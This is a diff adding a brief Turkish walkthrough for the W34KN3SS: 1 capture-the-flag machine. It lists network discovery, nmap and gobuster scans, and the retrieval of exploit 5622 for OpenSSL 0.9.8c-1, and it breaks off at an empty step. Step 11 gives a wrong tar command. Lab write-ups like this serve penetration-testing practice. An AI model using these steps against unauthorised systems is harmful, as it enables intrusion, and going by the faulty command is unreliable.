@@ -1,0 +1,13 @@
+W34KN3SS: 1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.44 bulundu.
+2 - nmap -A 192.168.2.44 
+3 - gobuster dir -u http://192.168.2.44 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.44/test
+5 - nano /etc/hosts, 192.168.2.44 weakness.jth
+6 - gobuster dir -u http://weakness.jth -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+7 - http://weakness.jth/private
+8 - searchsploit 'openssl 0.9.8c-1'
+9 - searchsploit -m 5622
+10 - bzip2 -d 5622.tar.bz2
+11 - tar -cvf 5622.tar
+12 - 
